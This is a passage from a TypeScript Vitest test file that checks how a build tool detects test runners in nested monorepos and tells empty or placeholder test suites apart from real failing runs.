      const dirChildren = new Map<string, Set<string>>();
      const allDirs = new Set<string>();
      const addChild = (dir: string, child: string): void => {
        let children = dirChildren.get(dir);
        if (!children) {
          children = new Set();
          dirChildren.set(dir, children);
        }
        children.add(child);
      };
      for (const item of layout.files) {
        const parts = item.path.split('/');
        for (let i = 0; i < parts.length - 1; i++) {
          addChild(parts.slice(0, i).join('/'), parts[i]);
          allDirs.add(parts.slice(0, i + 1).join('/'));
        }
        addChild(parts.slice(0, -1).join('/'), parts[parts.length - 1]);
      }

      fsMock.existsSync.mockImplementation((p: string) => {
        const rel = toWorkspaceRelativePath(p);
        return filesByPath.has(rel) || allDirs.has(rel);
      });
      // A single readdirSync mock must serve BOTH callers, since
      // mockImplementation replaces (it does not stack):
      //  - the .NET detector globs the WORKSPACE-root listing for a
      //    *.sln/*.csproj (existsSync alone cannot match an arbitrary
      //    project-file name), so the root must expose its top-level files;
      //  - the nested monorepo scan reads each services/apps/packages/src
      //    container's immediate children, served from `dirChildren`.
      fsMock.readdirSync.mockImplementation((p: string) => {
        const rel = toWorkspaceRelativePath(p);
        if (rel === WORKSPACE || rel === '') {
          // The workspace root listing exposes BOTH top-level files (so the
          // .NET detector can glob for *.sln/*.csproj) AND top-level
          // directories (so the generic depth-bounded walk discovers nested
          // packages under any container name, not a fixed allowlist).
          return Array.from(dirChildren.get('') ?? []);
        }
        const children = dirChildren.get(rel);
        return children ? Array.from(children) : [];
      });
      fsMock.readFileSync.mockImplementation((p: string) => {
        const rel = toWorkspaceRelativePath(p);
        const file = filesByPath.get(rel);
        if (!file) {
          throw new Error(`unexpected readFileSync for ${rel}`);
        }
        return file.content ?? '';
      });

      const runners = detectTestRunners(undefined);

      expect(runners.length > 0).toBe(layout.detectable);

      if (!layout.detectable) {
        expect(runners).toHaveLength(0);
        return;
      }

      // Multi-manifest and root+nested layouts make the two no-CI detectors
      // diverge in the empty-config auto-detection fallback, and that divergence
      // is the whole point of these fixtures: the merge-time AGENT detector
      // stops at the first detection level (a root-level runner globally
      // suppresses its nested-package scan and language fallbacks), so it emits
      // the SINGLE root family, whereas the onboarding (backend) detector walks
      // and catalogs EVERY directory additively (two runners for one polyglot
      // dir; a nested-package runner even when a root manifest exists). The
      // backend side is pinned to `onboard_families` in
      // test_onboard.py::test_shared_layout_parity. Asserting a sorted MULTISET
      // (rather than the old "exactly one runner") lets the fixture express the
      // documented difference explicitly so it can never silently widen.
      const expectedAgentFamilies = (layout.agent_families ?? [layout.family])
        .slice()
        .sort();
      const actualAgentFamilies = runners.map(familyFromRunner).sort();
      expect(actualAgentFamilies).toEqual(expectedAgentFamilies);

      // Strengthened parity: assert the FULL command (cmd + every arg) the
      // detector emits, not just the family — so a trailing-argument/flag drift
      // (e.g. pytest losing its `-x -q`) is caught in the agent's own local loop,
      // at parity with the backend source-scan. The dynamic-arg `script` family
      // keeps family-only verification (its two fixture members legitimately emit
      // `bash scripts/test.sh` vs `bash test.sh`); every other family maps to a
      // single fixed command in the shared commands fixture.
      const expectedCommands = expectedAgentFamilies
        .filter((family) => !DYNAMIC_ARG_FAMILIES.has(family as string))
        .map((family) => {
          const command = runnerCommands[family as string];
          expect(
            command,
            `commands fixture has no entry for detectable family '${family}'`,
          ).toBeTruthy();
          return command;
        })
        .sort();
      const actualCommands = runners
        .filter((runner) => !DYNAMIC_ARG_FAMILIES.has(familyFromRunner(runner) as string))
        .map((runner) => [runner.cmd, ...runner.args].join(' '))
        .sort();
      expect(actualCommands).toEqual(expectedCommands);
    });
  }

  it('every detectable non-script family has a non-empty command in the shared fixture', () => {
    // Guard: catches a missing key in test_runner_commands.json so the per-layout
    // full-command assertion above can never silently degrade to family-only for a
    // family whose command entry was dropped.
    const detectableFamilies = new Set<string>();
    for (const layout of sharedLayouts) {
      if (!layout.detectable) continue;
      for (const family of layout.agent_families ?? [layout.family]) {
        if (family && !DYNAMIC_ARG_FAMILIES.has(family)) {
          detectableFamilies.add(family);
        }
      }
    }
    const missing = [...detectableFamilies].filter(
      (family) => !runnerCommands[family] || !runnerCommands[family].trim(),
    );
    expect(missing).toEqual([]);
  });
});

// Parity: provision and probe detectors must cover the same language families
// as the suite detector. These tests use the same shared layout fixture and the
// same fs-mock setup so that a new family added to the suite detector without
// corresponding provision/probe support becomes a test failure.
describe('detectProvisioningSteps + detectAcceptanceProbes — shared layout parity', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
    mockFs.readdirSync.mockReturnValue([]);
  });
  afterEach(() => { vi.clearAllMocks(); });

  for (const layout of sharedLayouts) {
    if (!layout.provision_cmd && !layout.probe_cmd) continue;
    it(layout.name, () => {
      // Synthesize the same fs mock used by the suite parity loop above.
      const files = new Map(layout.files.map(f => [f.path, f.content ?? '']));
      const dirs = new Set<string>();
      for (const p of files.keys()) {
        let d = p.split('/').slice(0, -1).join('/');
        while (d) { dirs.add(d); d = d.split('/').slice(0, -1).join('/'); }
      }
      mockFs.existsSync.mockImplementation((p: string) => {
        const r = toWorkspaceRelativePath(p);
        return files.has(r) || dirs.has(r);
      });
      mockFs.readdirSync.mockImplementation((p: string) => {
        const r = toWorkspaceRelativePath(p);
        const isRoot = r === '' || r === WORKSPACE;
        const pre = isRoot ? '' : `${r}/`;
        return [...files.keys(), ...dirs].filter(k => k.startsWith(pre) && !k.slice(pre.length).includes('/'));
      });
      mockFs.readFileSync.mockImplementation((p: string) => {
        const r = toWorkspaceRelativePath(p);
        return files.get(r) ?? '';
      });

      if (layout.provision_cmd) {
        const steps = detectProvisioningSteps(undefined);
        expect(
          steps.some(s => [s.cmd, ...s.args].join(' ') === layout.provision_cmd),
          `${layout.name}: expected provision step '${layout.provision_cmd}'`,
        ).toBe(true);
      }
      if (layout.probe_cmd) {
        const probes = detectAcceptanceProbes(undefined);
        expect(
          probes.some(p => [p.cmd, ...p.args].join(' ') === layout.probe_cmd),
          `${layout.name}: expected probe '${layout.probe_cmd}'`,
        ).toBe(true);
      }
    });
  }
});

describe('detectTestRunners — nested monorepo / external layouts', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
    mockFs.readdirSync.mockReturnValue([]);
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  it('services/api/pyproject.toml (pytest) → python3 -m pytest at services/api', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/services` || p.endsWith('/services/api/pyproject.toml'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['services'];
      return p.endsWith('/services') ? ['api'] : [];
    });
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('pyproject.toml') ? '[tool.pytest.ini_options]\n' : '',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/services/api`);
  });

  it('apps/web/package.json with scripts.test → npm test at apps/web', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/apps` || p.endsWith('/apps/web/package.json'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['apps'];
      return p.endsWith('/apps') ? ['web'] : [];
    });
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('package.json') ? JSON.stringify({ scripts: { test: 'vitest run' } }) : '',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('npm');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/apps/web`);
  });

  it('apps/web/package.json WITHOUT scripts.test → no runner (conservative fall-through)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/apps` || p.endsWith('/apps/web/package.json'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['apps'];
      return p.endsWith('/apps') ? ['web'] : [];
    });
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('package.json') ? JSON.stringify({ scripts: { build: 'tsc' } }) : '',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('packages/core/Cargo.toml → cargo test; packages/svc/go.mod → go test ./...', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/packages` ||
      p.endsWith('/packages/core/Cargo.toml') ||
      p.endsWith('/packages/svc/go.mod'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['packages'];
      return p.endsWith('/packages') ? ['core', 'svc'] : [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(2);
    const byCwd = Object.fromEntries(runners.map(r => [r.cwd, r]));
    expect(byCwd[`${WORKSPACE}/packages/core`].cmd).toBe('cargo');
    expect(byCwd[`${WORKSPACE}/packages/core`].args).toEqual(['test']);
    expect(byCwd[`${WORKSPACE}/packages/svc`].cmd).toBe('go');
    expect(byCwd[`${WORKSPACE}/packages/svc`].args).toEqual(['test', './...']);
  });

  it('services/api/pom.xml → mvn test at services/api (maven nested)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/services` || p.endsWith('/services/api/pom.xml'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['services'];
      return p.endsWith('/services') ? ['api'] : [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('mvn');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/services/api`);
  });

  it('packages/web/Gemfile + Rakefile → bundle exec rake test (ruby nested)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/packages` ||
      p.endsWith('/packages/web/Gemfile') ||
      p.endsWith('/packages/web/Rakefile'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['packages'];
      return p.endsWith('/packages') ? ['web'] : [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('bundle');
    expect(runners[0].args).toEqual(['exec', 'rake', 'test']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/packages/web`);
  });

  it('apps/svc/*.csproj → dotnet test at apps/svc (.NET nested via readdir glob)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/apps`);
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['apps'];
      if (p.endsWith('/apps/svc')) return ['Service.csproj'];
      if (p.endsWith('/apps')) return ['svc'];
      return [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('dotnet');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/apps/svc`);
  });

  it('Go at repo ROOT (go.mod) → go test ./... at root', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/go.mod`);

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('go');
    expect(runners[0].args).toEqual(['test', './...']);
    expect(runners[0].cwd).toBe(WORKSPACE);
  });

  it('src/ as a single package directory (pytest.ini at src/) → python3 -m pytest at src', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/src` || p === `${WORKSPACE}/src/pytest.ini`,
    );
    // Workspace root lists `src`; src/ itself has no child dirs → only the
    // src-itself package fires.
    fs.readdirSync.mockImplementation((p: string) =>
      p === WORKSPACE ? ['src'] : [],
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/src`);
  });

  it('multiple sibling packages each emit a runner', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/services` ||
      p.endsWith('/services/a/setup.cfg') ||
      p.endsWith('/services/b/Cargo.toml'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['services'];
      return p.endsWith('/services') ? ['a', 'b'] : [];
    });
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('setup.cfg') ? '[tool:pytest]\naddopts = -q\n' : '',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(2);
    const cwds = runners.map(r => r.cwd).sort();
    expect(cwds).toEqual([`${WORKSPACE}/services/a`, `${WORKSPACE}/services/b`]);
  });

  it('nested package with no manifest → no runner (graceful)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/services`);
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['services'];
      return p.endsWith('/services') ? ['empty-pkg'] : [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('unreadable container directory → no runner (readdirSync throws, caught)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/services`);
    fs.readdirSync.mockImplementation(() => { throw new Error('EACCES'); });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('never emits a bare `pytest` cmd from the nested scan', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/services` || p.endsWith('/services/api/pytest.ini'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['services'];
      return p.endsWith('/services') ? ['api'] : [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].cmd).not.toBe('pytest');
  });

  it('stored build_config test_cmd suppresses the nested scan (precedence)', () => {
    const fs = mockFs;
    // A full nested monorepo is present on disk...
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/services` || p.endsWith('/services/api/pytest.ini'),
    );
    fs.readdirSync.mockImplementation((p: string) =>
      p.endsWith('/services') ? ['api'] : [],
    );

    const buildConfig: BuildConfig = {
      directories: [{ path: '', type: 'python', test_cmd: 'python3 -m pytest' }],
    };
    const runners = detectTestRunners(buildConfig);

    // ...but the stored test_cmd wins; the nested scan never fires.
    expect(runners).toHaveLength(1);
    expect(runners[0].cwd).toBe(WORKSPACE);
    expect(runners[0].cmd).toBe('python3');
  });

  it('Blueprint backend layout still wins over a nested services/ layout (self-repo unchanged)', () => {
    const fs = mockFs;
    // Both the Blueprint backend layout AND a nested services/ package exist.
    fs.existsSync.mockImplementation((p: string) =>
      p.endsWith('/backend/pytest.ini') ||
      p.endsWith('/scripts/test-backend.sh') ||
      p === `${WORKSPACE}/services` ||
      p.endsWith('/services/api/pytest.ini'),
    );
    fs.readdirSync.mockImplementation((p: string) =>
      p.endsWith('/services') ? ['api'] : [],
    );

    const runners = detectTestRunners(undefined);

    // The Blueprint backend runner is found first → noRunners() is false →
    // the nested scan never fires. Byte-for-byte identical to pre-change.
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('bash');
    expect(runners[0].args[0]).toBe('scripts/test-backend.sh');
  });

  // ── Non-allowlist top-level containers (the bug this fix closes) ───────────
  // The old fixed allowlist (services/apps/packages/libs/modules/crates/cmd/pkg
  // /src) silently missed suites under any other top-level directory. The
  // generic walk discovers them in the same dirs the backend BFS walks.

  it('server/api/pytest.ini (NON-allowlist container) → python3 -m pytest', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/server` || p.endsWith('/server/api/pytest.ini'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['server'];
      return p.endsWith('/server') ? ['api'] : [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/server/api`);
  });

  it('web/app/package.json with scripts.test (NON-allowlist) → npm test at web/app', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/web` || p.endsWith('/web/app/package.json'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['web'];
      return p.endsWith('/web') ? ['app'] : [];
    });
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('package.json') ? JSON.stringify({ scripts: { test: 'vitest run' } }) : '',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('npm');
    expect(runners[0].cwd).toBe(`${WORKSPACE}/web/app`);
  });

  it('tools/cli/go.mod (NON-allowlist container) → go test ./... at tools/cli', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/tools` || p.endsWith('/tools/cli/go.mod'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['tools'];
      return p.endsWith('/tools') ? ['cli'] : [];
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('go');
    expect(runners[0].args).toEqual(['test', './...']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/tools/cli`);
  });

  it('app/Cargo.toml (singular, NON-allowlist top-level package) → cargo test at app', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/app` || p.endsWith('/app/Cargo.toml'),
    );
    fs.readdirSync.mockImplementation((p: string) =>
      p === WORKSPACE ? ['app'] : [],
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('cargo');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/app`);
  });

  it('skips vendored/dependency/build dirs and dotdirs (no spurious runner from node_modules)', () => {
    const fs = mockFs;
    // node_modules contains a package.json with a test script, but it must be
    // skipped — only the real suite under server/ should emit a runner.
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/server` ||
      p.endsWith('/server/api/pytest.ini') ||
      p.endsWith('/node_modules/foo/package.json') ||
      p.endsWith('/.git/pkg/package.json'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['server', 'node_modules', '.git', 'vendor', '.venv'];
      if (p.endsWith('/server')) return ['api'];
      if (p.endsWith('/node_modules')) return ['foo'];
      if (p.endsWith('/.git')) return ['pkg'];
      return [];
    });
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('package.json') ? JSON.stringify({ scripts: { test: 'vitest' } }) : '',
    );

    const runners = detectTestRunners(undefined);

    // Only the server/api pytest suite — node_modules/.git/vendor/.venv skipped.
    expect(runners).toHaveLength(1);
    expect(runners[0].cwd).toBe(`${WORKSPACE}/server/api`);
    expect(runners[0].cmd).toBe('python3');
  });

  it('bounds the walk to ~40 directories (no runaway emission on a huge repo)', () => {
    const fs = mockFs;
    // 100 top-level package dirs, each carrying a real Cargo.toml. A bounded
    // walk must emit far fewer than 100 runners (cap is 40 inspected dirs).
    const topDirs = Array.from({ length: 100 }, (_, i) => `pkg${i}`);
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/Cargo.toml'));
    fs.readdirSync.mockImplementation((p: string) =>
      p === WORKSPACE ? topDirs : [],
    );

    const runners = detectTestRunners(undefined);

    expect(runners.length).toBeGreaterThan(0);
    expect(runners.length).toBeLessThanOrEqual(40);
  });

  it('unreadable workspace root → no runner (readdirSync(WORKSPACE) throws, caught)', () => {
    const fs = mockFs;
    fs.existsSync.mockReturnValue(false);
    fs.readdirSync.mockImplementation(() => { throw new Error('EACCES'); });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });
});

describe('detectAutoTestRunners — buildConfig-suppressed auto-detection (stale-command self-heal)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
    mockFs.readdirSync.mockReturnValue([]);
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  it('returns the same runners as detectTestRunners(undefined) — auto-detection only', () => {
    const fs = mockFs;
    // A real replacement suite lives at services/api even though a (stale)
    // stored command might exist elsewhere.
    fs.existsSync.mockImplementation((p: string) =>
      p === `${WORKSPACE}/services` || p.endsWith('/services/api/pytest.ini'),
    );
    fs.readdirSync.mockImplementation((p: string) => {
      if (p === WORKSPACE) return ['services'];
      return p.endsWith('/services') ? ['api'] : [];
    });

    const auto = detectAutoTestRunners();
    const baseline = detectTestRunners(undefined);

    expect(auto).toEqual(baseline);
    expect(auto).toHaveLength(1);
    expect(auto[0].cmd).toBe('python3');
    expect(auto[0].cwd).toBe(`${WORKSPACE}/services/api`);
  });

  it('ignores any stored build_config entirely (no buildConfig argument)', () => {
    const fs = mockFs;
    // Makefile with a real test target is on disk — detectAutoTestRunners finds
    // it regardless of what a stored config would have said.
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/Makefile'));
    fs.readFileSync.mockReturnValue('test:\n\tgo test ./...\n');

    const runners = detectAutoTestRunners();

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('make');
    expect(runners[0].args).toEqual(['test']);
  });

  it('finds nothing when the workspace carries no runnable suite', () => {
    mockFs.existsSync.mockReturnValue(false);
    expect(detectAutoTestRunners()).toHaveLength(0);
  });
});

describe('describeRunnerDirectory — runner → build_config directory descriptor', () => {
  const mk = (cmd: string, args: string[], cwd: string): TestRunner => ({ cmd, args, cwd, label: 'x' });

  it('maps a nested pytest runner to {path, type:python, test_cmd}', () => {
    expect(describeRunnerDirectory(mk('python3', ['-m', 'pytest', '-x', '-q'], `${WORKSPACE}/services/api`)))
      .toEqual({ path: 'services/api', type: 'python', test_cmd: 'python3 -m pytest -x -q' });
  });

  it('maps a root runner to an empty path', () => {
    expect(describeRunnerDirectory(mk('npm', ['test'], WORKSPACE)))
      .toEqual({ path: '', type: 'node', test_cmd: 'npm test' });
  });

  it('derives type from the runner command kind', () => {
    expect(describeRunnerDirectory(mk('go', ['test', './...'], `${WORKSPACE}/svc`)).type).toBe('go');
    expect(describeRunnerDirectory(mk('cargo', ['test'], `${WORKSPACE}/core`)).type).toBe('rust');
    expect(describeRunnerDirectory(mk('tox', [], WORKSPACE)).type).toBe('python');
  });

  // make targets, bash/sh script suites, and unrecognized commands have no
  // dedicated language bucket; they MUST map to the schema-valid catch-all
  // 'other' so the recovered directory entry stays inside the
  // BuildConfigDirectoryEntry.type enum (^(python|node|go|rust|other)$) and does
  // not force the backend's schema-invalid raw-store fallback.
  it('maps make/shell/unknown commands to the schema-valid "other" type', () => {
    expect(describeRunnerDirectory(mk('make', ['test'], WORKSPACE)).type).toBe('other');
    expect(describeRunnerDirectory(mk('bash', ['test.sh'], WORKSPACE)).type).toBe('other');
    expect(describeRunnerDirectory(mk('sh', ['run-tests.sh'], WORKSPACE)).type).toBe('other');
    expect(describeRunnerDirectory(mk('gradle', ['test'], WORKSPACE)).type).toBe('other');
  });

  it('unwraps a `bash -c` runner back to the original test_cmd (not the wrapper)', () => {
    // A shell-composed test_cmd is run via `bash -c '<cmd>'`. The recovered
    // directory descriptor must reconstruct the ORIGINAL command so a stale
    // stored config converges onto what the operator wrote, and type keys off
    // the unwrapped first token.
    expect(describeRunnerDirectory(mk('bash', ['-c', 'go test ./... && go vet ./...'], `${WORKSPACE}/core`)))
      .toEqual({ path: 'core', type: 'go', test_cmd: 'go test ./... && go vet ./...' });
    expect(describeRunnerDirectory(mk('bash', ['-c', 'pytest -k "not slow" || true'], `${WORKSPACE}/svc`)))
      .toEqual({ path: 'svc', type: 'python', test_cmd: 'pytest -k "not slow" || true' });
  });
});

describe('classifyTestExecution — placeholder/empty suite detection', () => {
  it('npm "no test specified" placeholder → no_tests', () => {
    expect(classifyTestExecution(
      'Error: no test specified\nnpm ERR! Test failed.',
    )).toBe('no_tests');
  });

  it('pytest "collected 0 items" → no_tests', () => {
    expect(classifyTestExecution(
      'collected 0 items\n\nno tests ran in 0.01s',
    )).toBe('no_tests');
  });

  it('pytest collection/import/conftest error-only output → ran', () => {
    expect(classifyTestExecution(
      'collected 0 items / 1 error\n\nERROR tests/test_import.py - ImportError: cannot import name foo\n1 error in 0.01s',
    )).toBe('ran');
  });

  it('pytest empty-suite text mixed with a real failure marker → ran', () => {
    expect(classifyTestExecution(
      'FAILED src/foo.test.ts > test_command_parser\nAssertionError: collected 0 items but 1 test failed',
    )).toBe('ran');
  });

  it('pytest "no tests ran" → no_tests', () => {
    expect(classifyTestExecution('no tests ran in 0.02s')).toBe('no_tests');
  });

  it('vitest "No test files found" → no_tests', () => {
    expect(classifyTestExecution(
      'No test files found, exiting with code 1',
    )).toBe('no_tests');
  });

  it('npm missing script ("Missing script") → no_tests', () => {
    expect(classifyTestExecution(
      'Error: Missing script: "test"\nnpm ERR! Test failed.',
    )).toBe('no_tests');
  });

  it('yarn missing script ("Command not found") → no_tests', () => {
    expect(classifyTestExecution(
      'error Command "test" not found.',
    )).toBe('no_tests');
  });

  it('pnpm missing script command → no_tests', () => {
    expect(classifyTestExecution(
      'ERR!  No matching version found for test\nerror: command not found: test',
    )).toBe('no_tests');
  });

  it('bash "command not found" → no_tests', () => {
    expect(classifyTestExecution(
      'bash: pytest: command not found',
    )).toBe('no_tests');
  });

  it('zsh "command not found: pytest" → no_tests', () => {
    expect(classifyTestExecution(
      'zsh: command not found: pytest',
    )).toBe('no_tests');
  });

  // Regression: a genuinely failing suite whose output merely CONTAINS the
  // words "command" and "not found" non-adjacently must classify as a real
  // run so its failure blocks the no-CI merge gate. The pre-fix classifier
  // (two independent whole-output substring checks) misread all three of
  // these as "no_tests", failing the gate open.
  it('failing suite — signal words on different lines → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_command_parser\nE   KeyError: 'x' not found",
    )).toBe('ran');
  });

  it('failing suite — "element not found" assertion far from test id → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_command_handler - assert 'element not found' in body",
    )).toBe('ran');
  });

  it('failing suite — "404 Not Found" assertion → ran', () => {
    expect(classifyTestExecution(
      'FAILED test_command_router - 404 Not Found',
    )).toBe('ran');
  });

  it('make missing target ("No rule to make target") → no_tests', () => {
    expect(classifyTestExecution(
      'make: *** No rule to make target `test\'. Stop.',
    )).toBe('no_tests');
  });

  it('make missing target with single quotes → no_tests', () => {
    expect(classifyTestExecution(
      "make: *** No rule to make target 'test'. Stop.",
    )).toBe('no_tests');
  });

  // Regression: a genuinely failing suite whose output merely QUOTES a
  // placeholder phrase as assertion data (not a runner diagnostic) must
  // classify as a real run so its failure blocks the no-CI merge gate. The
  // pre-fix classifier used whole-output substring checks that misread all of
  // these as "no_tests", failing the gate open.
  it('failing test asserting on literal "no test specified" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_cli.py::test_help - AssertionError: expected 'no test specified' in output\n1 failed in 0.30s",
    )).toBe('ran');
  });

  it('failing test asserting on full literal "Error: no test specified" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_cli.py::test_help - AssertionError: expected 'Error: no test specified' in output\n1 failed in 0.30s",
    )).toBe('ran');
  });

  it('failing test asserting on literal "Missing script" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_pkg.py::test_error - AssertionError: 'Missing script' not in stderr\n1 failed in 0.12s",
    )).toBe('ran');
  });

  it('failing test asserting on full literal "Missing script: \\"test\\"" → ran', () => {
    expect(classifyTestExecution(
      'FAILED test_pkg.py::test_error - AssertionError: expected \'Missing script: "test"\' in stderr\n1 failed in 0.12s',
    )).toBe('ran');
  });

  it('failing test asserting on literal "No rule to make target" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_make.py::test_help - AssertionError: 'No rule to make target' in help_text\n1 failed in 0.08s",
    )).toBe('ran');
  });

  it('failing test asserting on full make diagnostic literal → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_make.py::test_help - AssertionError: expected \"make: *** No rule to make target 'test'. Stop.\" in stderr\n1 failed in 0.08s",
    )).toBe('ran');
  });

  it('failing test asserting on literal "no tests ran" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_runner.py::test_msg - AssertionError: expected 'no tests ran' message\n1 failed in 0.05s",
    )).toBe('ran');
  });

  it('failing test asserting on full literal "no tests ran in 0.02s" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_runner.py::test_msg - AssertionError: expected 'no tests ran in 0.02s' message\n1 failed in 0.05s",
    )).toBe('ran');
  });

  it('failing test asserting on literal "collected 0 items" mid-line → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_pytest_wrapper.py::test_banner - assert 'collected 0 items' in captured\n1 failed in 0.04s",
    )).toBe('ran');
  });

  it('failing test asserting on literal "no test files" mid-line → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_vitest_wrapper.ts - expected stderr to contain 'no test files'\n Tests  1 failed (1)",
    )).toBe('ran');
  });

  it('failing test asserting on literal "no tests to run" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_go_wrapper.py::test_filter - AssertionError: 'no tests to run' not in out\n1 failed in 0.06s",
    )).toBe('ran');
  });

  it('failing test asserting on full literal "[no tests to run]" → ran', () => {
    expect(classifyTestExecution(
